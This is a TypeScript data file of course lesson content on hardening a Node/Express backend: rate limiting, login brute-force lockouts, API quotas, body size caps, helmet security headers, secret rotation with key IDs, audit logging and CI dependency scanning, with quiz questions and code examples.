        subBlockId: '6.1',
        label: 'CIA Triad & Defense in Depth (6.1.3, 6.1.6)',
        detail: 'Protecting Availability alongside Confidentiality and Integrity in live environments.',
      },
      {
        subBlockId: '3.2',
        label: 'HTTP Middleware Pipeline (3.2.6)',
        detail: 'Applying edge protections (rate limits, headers, body caps) before heavy handlers run.',
      },
    ],
  },
  topicSections: [
    {
      id: 'topic-6.5.1',
      topicId: '6.5.1',
      coveredTopicIds: ['6.5.2', '6.5.3', '6.5.7'],
      title: 'Protecting availability: Rate limiting, brute-force protection, API quotas, and request size limits',
      problemAndRequirementsMarkdown: [
        '### First principles: Why every open endpoint needs traffic & payload boundaries',
        'Even if your business logic has zero bugs, an attacker can still destroy availability or crack accounts simply through **volume**:',
        '- Sending 10,000 password guesses per minute against `/auth/login` or `/auth/reset-password` (**Brute-force / Credential Stuffing**).',
        '- Sending 50,000 expensive `/search` requests from one buggy client script (**Availability exhaustion**).',
        '- Streaming a 500 MB JSON body into an endpoint expecting a 2 KB signup form, locking up Node’s parser or exhausting RAM (**Payload DoS**).',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### Four distinct boundary controls (often confused!)',
        '1. **Rate Limiting**: Short-window traffic throttling (e.g., **Token Bucket** or **Sliding Window** in Redis: *“Max 100 requests per minute per IP or API key”*). Protects burst capacity and returns `429 Too Many Requests` + `Retry-After` header.',
        '2. **Brute-Force Protection**: Targeted defense on auth endpoints (`/login`, `/otp`, `/forgot-password`). Slows or locks out repeated failures **per account/email AND per IP** (e.g., exponential backoff or temporary lockout after 5 bad passwords)—so even a botnet using 5,000 IPs can’t hammer one victim’s account!',
        '3. **API Quotas**: Long-window business/tier allowances (e.g., *“Free tier: 10,000 API calls/month; Pro tier: 1,000,000 calls/month”*). Unlike rate limits (seconds/minutes to protect server stability), quotas enforce billing plans and fair usage over days/months.',
        '4. **Request Size Limits**: Hard byte caps enforced *before* parsing the entire body (`express.json({ limit: "100kb" })`, reverse-proxy `client_max_body_size`, and explicit file-upload size caps). Reject oversized payloads early with `413 Payload Too Large`.',
      ].join('\n\n'),
      centralIdeaSummary:
        'Rate limits cap short-term bursts, brute-force rules guard credential endpoints per-account and per-IP, quotas govern long-term usage tiers, and request size limits stop oversized payload crashes.',
      codeExamples: [],
    },
    {
      id: 'topic-6.5.4',
      topicId: '6.5.4',
      coveredTopicIds: ['6.5.5', '6.5.6'],
      title: 'Secret management, key rotation, and audit logging',
      problemAndRequirementsMarkdown: [
        '### First principles: What happens when code leaks or an admin misbehaves?',
        'Developers routinely paste `STRIPE_SECRET=sk_live_...` or `JWT_SECRET=...` into code or `.env` committed to Git. Once committed—even if deleted in the next commit—it lives in Git history forever! And if you *never* rotate that key, a single leak from 2 years ago stays valid indefinitely.',
        '',
        'Meanwhile, standard debug logs (`console.log("Error")`) tell you *nothing* when an enterprise customer asks: *“Who changed our billing email and exported all invoices last Tuesday at 14:02 UTC?”*',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### Operational controls for secrets and accountability',
        '1. **Secret Management**: Never hardcode secrets in source files or Git. Inject them at runtime via environment variables backed by a **Secrets Manager** (AWS Secrets Manager, GCP Secret Manager, Vault), scoped per environment (`dev` vs `prod` never share keys!), and **scrubbed from logs and error stacks**.',
        '2. **Key Rotation (Zero-Downtime)**: How do you replace `JWT_SIGNING_KEY` or an API key without kicking every user off at once? **Support two active keys briefly using Key IDs (`kid`)**:',
        '   - Step 1: Add `key_v2` alongside `key_v1` so verification accepts **both** (`[key_v2, key_v1]`).',
        '   - Step 2: Switch new signing to `key_v2`.',
        '   - Step 3: Once `key_v1` tokens naturally expire, remove `key_v1` cleanly!',
        '3. **Audit Logging**: Unlike noisy application debug logs, an **Audit Log** is an **append-only, tamper-resistant record** of security-sensitive business actions: **Who** (`actorId`, `ip`), **What** (`action: "role.changed"`, `targetId`), **When** (UTC timestamp), and **Outcome** (`success` / `denied`)—with **zero secrets or raw passwords logged**.',
      ].join('\n\n'),
      centralIdeaSummary:
        'Keep secrets out of code via runtime secret managers, support overlapping key IDs (`kid`) for zero-downtime key rotation, and capture sensitive security events in append-only audit logs.',
      codeExamples: [],
    },
    {
      id: 'topic-6.5.8',
      topicId: '6.5.8',
      coveredTopicIds: ['6.5.9'],
      title: 'Security headers and dependency vulnerability scanning',
      problemAndRequirementsMarkdown: [
        '### First principles: Securing browser responses and the code you didn’t write',
        'Even an API backend sits inside two bigger ecosystems:',
        '1. **Browsers** reading your HTTP responses (HTML docs, error pages, or Swagger UI) rely on response headers to know whether HTTPS is mandatory, whether your page may be embedded in an invisible `<iframe>` (clickjacking), or whether the browser should guess MIME types.',
        '2. **Your `node_modules` / dependencies** often make up 90% of the code running inside your Node.js process! One vulnerable parser or HTTP helper in a transitive dependency exposes your app even if your own code is spotless.',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### Defending the HTTP envelope and software supply chain',
        '1. **Security Headers** (applied globally via middleware like `helmet` or reverse proxy):',
        '   - `Strict-Transport-Security` (**HSTS**): Tells browsers *“Always talk to this domain over HTTPS—never downgrade to HTTP.”*',
        '   - `X-Content-Type-Options: nosniff`: Stops browsers from guessing MIME types and executing a disguised `.txt` upload as JavaScript.',
        '   - `Content-Security-Policy` (**CSP**) & `frame-ancestors \'none\'` (or `X-Frame-Options: DENY`): Restricts script sources (mitigating XSS) and blocks clickjacking frames.',
        '   - `Referrer-Policy`: Prevents leaking sensitive URL paths/tokens to third-party sites in `Referer` headers.',
        '2. **Dependency Vulnerability Scanning**: Automate lockfile scanning (`npm audit`, Dependabot, Snyk, Trivy) in **CI/CD** on every PR and nightly schedule. Pin lockfiles (`package-lock.json`) and triage critical CVEs affecting reachable server paths (e.g., auth, XML/JSON parsers, HTTP servers).',
      ].join('\n\n'),
      centralIdeaSummary:
        'Emit defensive HTTP security headers on every response and automate dependency vulnerability scanning against pinned lockfiles in CI/CD.',
      codeExamples: [],
    },
  ],
  conceptConnection: {
    title: 'Production hardening stack around your core backend',
    narrativeMarkdown: [
      'Watch how `6.5` surrounds your application core with outer guardrails before business logic even runs, plus operational observability afterward:',
      '- **Before parsing**: Size caps (`413`) + Security Headers + Rate Limiting (`429`) + Login Brute-Force Throttling.',
      '- **Configuration & Rotation**: Runtime Secrets Manager + dual-key `kid` rotation.',
      '- **After sensitive mutations**: Append-only Audit Log + continuous CI Dependency Scanning.',
    ].join('\n\n'),
    integratedExample: {
      id: '6.5-integrated-example',
      title: 'Production Security Guardrails Around Request Lifecycle',
      language: 'text',
      code: `Client Request
  ├─► Security Headers middleware (HSTS, nosniff, CSP, Referrer-Policy)
  ├─► Request Size Limit (reject > 100kb JSON -> 413 Payload Too Large)
  ├─► Rate Limit + Auth Brute-Force Guard (Redis counter -> 429 Retry-After)
  ├─► API Quota Check (Monthly tenant allowance check)
  ├─► Business Handler (uses Secrets Manager keys + kid rotation)
  └─► Append-Only Audit Log (actor, action, target, ip, timestamp — NO secrets!)

Out-of-band CI Pipeline:
  └─► npm audit / Dependabot / Trivy scans lockfile on every PR`,
    },
    walkthroughMarkdown:
      'Switch to the **Recipe** tab next to build concrete Express/TypeScript middleware for rate limiting, brute-force locks, secret rotation, audit logging, size caps, security headers, and dependency scanning.',
  },
  questions: [
    {
      id: '6.5-kc-1',
      focusArea: 'Rate Limits vs Brute-Force vs Quotas',
      prompt:
        'Why is an IP-only **rate limit** of 100 requests/minute insufficient to protect `POST /auth/login` against **brute-force** attacks—and how do **rate limits**, **brute-force protection**, and **API quotas** differ?',
      hints: [
        'What if an attacker uses 1,000 different IP addresses (a botnet) to try 5 passwords each against `victim@corp.com`?',
        'Compare time windows and purposes: protecting bursts vs. protecting passwords vs. enforcing billing plans.',
        'Distributed attackers bypass IP-only rate limits easily; login needs per-account/email throttling or lockout. Rate limits cap short bursts, brute-force guards protect auth endpoints, and quotas track longer-term usage plans.',
      ],
      explanation:
        'A distributed botnet using thousands of IPs stays easily below 100 req/min per IP while hammering a single account. **Brute-force protection** throttles or backs off failed attempts keyed by `(accountEmail, IP)` on auth routes. **Rate limiting** protects immediate infrastructure availability over seconds/minutes, while **API quotas** govern sustained usage over days/months (e.g., billing tiers).',
      evaluationCriteria: [
        'Explains why per-IP limits fail against distributed login brute-forcing (need per-account tracking)',
        'Cleanly differentiates rate limiting, brute-force protection, and API quotas',
      ],
      topicIds: ['6.5.1', '6.5.2', '6.5.3', '6.5.7'],
    },
    {
      id: '6.5-kc-2',
      focusArea: 'Secret Management, Key Rotation & Audit Logs',
      prompt:
        'How do you perform **key rotation** for a JWT signing secret in production without immediately breaking every logged-in user’s valid token—and what makes an **audit log** different from `console.log`?',
      hints: [
        'Think about verifying *both* old and new keys temporarily using a `kid` header.',
        'What guarantees should an audit log give regarding mutability and sensitive payloads?',
        'Accept both `[newKey, oldKey]` indexed by `kid` while issuing tokens only with `newKey` until `oldKey` expires; audit logs are append-only, structured records of actor/action/target/outcome with secrets scrubbed.',
      ],
      explanation:
        'Zero-downtime **key rotation** uses overlapping verification keys identified by a `kid` (Key ID): deploy the new key into the verification keyset while still trusting the old key, switch signing to the new key, and retire the old key once its maximum token TTL passes. **Audit logging** writes immutable, structured records of security-critical actions (actor, action, resource, IP, timestamp, outcome) without leaking secrets.',
      evaluationCriteria: [
        'Describes overlapping dual-key acceptance (`kid`) during rotation window',
        'Contrasts append-only security audit trails against general debug logs and emphasizes scrubbing secrets',
      ],
      topicIds: ['6.5.4', '6.5.5', '6.5.6'],
    },
  ],
};

export const LESSON_6_5_RECIPE: RecipeLessonContent = {
  purposeMarkdown:
    'Implement production hardening controls around an HTTP backend: Redis-backed rate limiting & login brute-force protection, monthly API quotas, strict request size limits, security headers (`helmet`), secret validation with zero-downtime `kid` key rotation, structured audit logging, and CI dependency scanning.',
  whenToUseMarkdown:
    'Apply these guardrails as standard baseline configuration on every internet-facing API before shipping to production.',
  setupCommands: [
    {
      id: '6.5-setup-1',
      label: 'Install helmet and Redis rate-limiting dependencies',
      command: 'npm install helmet rate-limiter-flexible ioredis',
      notes: 'Use Redis-backed limiters in production so limits hold across multiple server instances.',
    },
    {
      id: '6.5-setup-2',
      label: 'Run dependency vulnerability audit locally & in CI',
      command: 'npm audit --audit-level=high',
      notes: 'Fails CI builds when high or critical vulnerabilities appear in production dependencies.',
    },
  ],
  coreApisMarkdown: [
    '- **`helmet(...)`**: Sets `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, and `Referrer-Policy`.',
    '- **`express.json({ limit: "100kb" })`**: Drops oversized request bodies early with `413 Payload Too Large`.',
    '- **`RateLimiterRedis` (or Redis INCR/TTL)**: Tracks short-window IP/API-key rate limits, per-account login failures (brute-force), and monthly API quotas atomically.',
    '- **Multi-Key Registry (`keysByKid`)**: Signs with `CURRENT_KID` while verifying signatures against all active `kid` entries for zero-downtime rotation.',
  ].join('\n'),
  workflowSteps: [
    {
      stepNumber: 1,
      title: 'Apply security headers & strict request size caps first in the pipeline',
      detailMarkdown:
        'Mount `helmet()` and `express.json({ limit })` *before* routes so attackers cannot overwhelm JSON parsing or receive unhardened browser headers.',
      code: {
        id: '6.5-step-1',
        title: 'Security headers + request body size limits in Express',
        language: 'typescript',
        code: `import express from "express";
import helmet from "helmet";

const app = express();
app.disable("x-powered-by");

// 1. Defensive HTTP security headers (6.5.8)
app.use(
  helmet({
    hsts: { maxAge: 31_536_000, includeSubDomains: true },
    frameguard: { action: "deny" },
    referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  })
);

// 2. Hard body size limit to prevent memory exhaustion DoS (6.5.7)
app.use(express.json({ limit: "100kb" }));`,
      },
    },
    {
      stepNumber: 2,
      title: 'Enforce short-window rate limits, per-account brute-force lockouts & API quotas',
      detailMarkdown:
        'Separate general API throttling (per IP/key), credential brute-force tracking (keyed by normalized email + IP on failed logins), and monthly tenant quotas.',
      code: {
        id: '6.5-step-2',
        title: 'Rate limit, login brute-force lockout & monthly API quota middleware',
        language: 'typescript',
        code: `import { RateLimiterRedis } from "rate-limiter-flexible";
import Redis from "ioredis";

const redis = new Redis(process.env.REDIS_URL!);

// General burst rate limit: 120 req/min per IP (6.5.1)
export const apiBurstLimiter = new RateLimiterRedis({
  storeClient: redis,
  keyPrefix: "rl:api",
  points: 120,
  duration: 60,
});

// Login brute-force guard: 5 failed attempts per email+IP -> block 15m (6.5.2)
export const loginFailLimiter = new RateLimiterRedis({
  storeClient: redis,
  keyPrefix: "bf:login",
  points: 5,
  duration: 60 * 15,
  blockDuration: 60 * 15,
});

// Monthly API quota helper keyed by tenant + YYYY-MM (6.5.3)
export async function consumeMonthlyQuota(tenantId: string, monthlyLimit: number) {
  const monthKey = new Date().toISOString().slice(0, 7);
  const key = \`quota:\${tenantId}:\${monthKey}\`;
  const used = await redis.incr(key);
  if (used === 1) await redis.expire(key, 60 * 60 * 24 * 35);
  return { allowed: used <= monthlyLimit, remaining: Math.max(0, monthlyLimit - used) };
}`,
      },
    },
    {
      stepNumber: 3,
      title: 'Support zero-downtime key rotation and write scrubbed audit logs',
      detailMarkdown:
        'Load secrets strictly from environment/Secret Manager at boot (`6.5.4`), look up signing keys by `kid` (`6.5.5`), and record security-critical events in an append-only audit log (`6.5.6`).',
      code: {
        id: '6.5-step-3',
        title: 'Dual-key rotation lookup + safe structured audit logger',
        language: 'typescript',
        code: `// 6.5.4 + 6.5.5 Secret management & overlapping key rotation
const SIGNING_KEYS: Record<string, string> = JSON.parse(
  process.env.JWT_KEYS_JSON! // e.g. { "k2": "new_secret", "k1": "old_secret" }
);
const ACTIVE_SIGNING_KID = process.env.JWT_ACTIVE_KID!; // "k2"

export function getVerificationKey(kid: string): string {
  const key = SIGNING_KEYS[kid];
  if (!key) throw new Error("Unknown signing key id");
  return key;
}

// 6.5.6 Append-only audit log helper (never include password/token values!)
export interface AuditEvent {
  actorId: string;
  orgId: string;
  action: "auth.login_failed" | "role.updated" | "api_key.rotated";
  targetId?: string;
  ip: string;
  outcome: "success" | "denied";
}

export async function writeAuditLog(db: any, evt: AuditEvent): Promise<void> {
  await db.query(
    \`INSERT INTO audit_logs (actor_id, org_id, action, target_id, ip, outcome, occurred_at)
     VALUES ($1, $2, $3, $4, $5, $6, NOW())\`,
    [evt.actorId, evt.orgId, evt.action, evt.targetId ?? null, evt.ip, evt.outcome]
  );
}`,
      },
    },
  ],
  workingExamples: [
    {
      id: '6.5-ex-ci-audit',
      title: 'GitHub Actions CI dependency vulnerability check (6.5.9)',
      language: 'yaml',
      code: `name: Security Dependency Scan
on: [push, pull_request, schedule]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - run: npm audit --omit=dev --audit-level=high`,
      explanation:
        'Pins dependencies via `npm ci` (lockfile) and blocks merges or alerts weekly if production dependencies acquire high/critical CVEs.',
    },
  ],
  commonMistakes: [
    {
      mistake: 'Using an in-memory `Map` rate limiter when running multiple API containers behind a load balancer.',
      fix: 'Back rate limits and brute-force counters with shared Redis so attackers cannot multiply limits across pods.',
    },
    {
      mistake: 'Logging `req.body` or `req.headers` blindly inside audit logs.',
      fix: 'Explicitly allow-list safe audit fields (`actorId`, `action`, `targetId`, `ip`, `outcome`) so passwords, JWTs, and API keys never hit disk.',
    },
    {
      mistake: 'Swapping `JWT_SECRET` abruptly during deployment without an overlap period.',
      fix: 'Use `kid` multi-key verification so existing sessions stay valid until natural expiration.',
    },
  ],
  exercise: {
    id: '6.5-ex',
    title: 'Harden an Auth & Public API Entrypoint',
    instructionsMarkdown:
      'Combine the controls above into a runnable Express setup:\n1. Add `helmet()` headers and a `100kb` JSON size limit.\n2. Wire rate limiting (`429` + `Retry-After`) and per-`email:ip` login brute-force throttling.\n3. Add `writeAuditLog` on login failure and role changes, plus multi-`kid` verification support and a CI `npm audit` gate.',
    acceptanceChecklist: [
      'Security headers (HSTS, nosniff, frameguard) and payload limit (413) run before route handlers',
      'Login brute-force protection tracks failed attempts by account + IP, distinct from general burst rate limits and monthly quotas',
      'Secrets load from Secret Manager/env at boot with overlapping `kid` key rotation support',
      'Audit logs capture actor, action, target, IP, timestamp, and outcome without logging secrets, and lockfiles are scanned in CI',
    ],
  },
};
